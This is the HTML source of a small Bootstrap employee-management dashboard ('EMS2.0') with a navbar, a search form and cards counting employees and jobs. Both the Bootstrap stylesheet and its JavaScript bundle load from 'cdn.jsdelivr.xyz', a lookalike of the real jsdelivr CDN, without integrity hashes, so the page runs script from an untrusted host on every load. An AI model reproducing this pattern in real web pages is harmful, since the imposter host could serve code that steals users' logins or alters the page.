<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Dashboard</title>
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
      integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link rel="stylesheet" href="./style.css" />
  </head>
  <body>
    <nav class="navbar navbar-dark navbar-expand-lg bg-dark shadow">
      <div class="container-fluid">
        <a class="navbar-brand brandGraient" href="#">EMS2.0</a>
        <button
          class="navbar-toggler"
          type="button"
          data-bs-toggle="collapse"
          data-bs-target="#navbarSupportedContent"
          aria-controls="navbarSupportedContent"
          aria-expanded="false"
          aria-label="Toggle navigation"
        >
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarSupportedContent">
          <ul class="navbar-nav me-auto mb-2 mb-lg-0">
            <li class="nav-item">
              <a class="nav-link active" aria-current="page" href="index.html"
                >Home</a
              >
            </li>
            <li class="nav-item">
              <a class="nav-link" href="./employees.html">Employees</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="./jobs.html">jobs</a>
            </li>
          </ul>
          <form class="d-flex gap-3" role="search">
            <div class="input-group">
              <input
                type="text"
                class="form-control"
                placeholder="Search for"
                aria-label="Recipient's username"
                aria-describedby="button-addon2"
              />
              <button class="btn btn-success" type="button" id="button-addon2">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="16"
                  height="16"
                  fill="currentColor"
                  class="bi bi-search"
                  viewBox="0 0 16 16"
                >
                  <path
                    d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"
                  />
                </svg>
              </button>
            </div>
            <div class="vr"></div>
            <div>
              <a class="btn btn-warning" href="./index.html">
                <i class="fa-solid fa-power-off"></i>
              </a>
            </div>
          </form>
        </div>
      </div>
    </nav>
    <div class="container-fluid mt-3">
      <div class="row justify-content-center">
        <div class="col-md-3">
          <div class="card bg-primary text-white text-center fs-5 mb-3 shadow">
            <div class="card-header">Employees List</div>
            <div class="card-body">
              <label class="card-text fs-1">254+</label>
            </div>
            <div class="card-footer small">
              <a href="employees.html" class="text-decoration-none text-white"
                >View all Employees</a
              >
            </div>
          </div>
        </div>
        <div class="col-md-3">
          <div class="card bg-primary text-white text-center fs-5 mb-3 shadow">
            <div class="card-header">Jobs List</div>
            <div class="card-body">
              <label class="card-text fs-1">25+</label>
            </div>
            <div class="card-footer small">
              <a href="jobs.html" class="text-decoration-none text-white"
                >View all Jobs</a
              >
            </div>
          </div>
        </div>
      </div>
    </div>
    <script src="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"></script>
  </body>
</html>
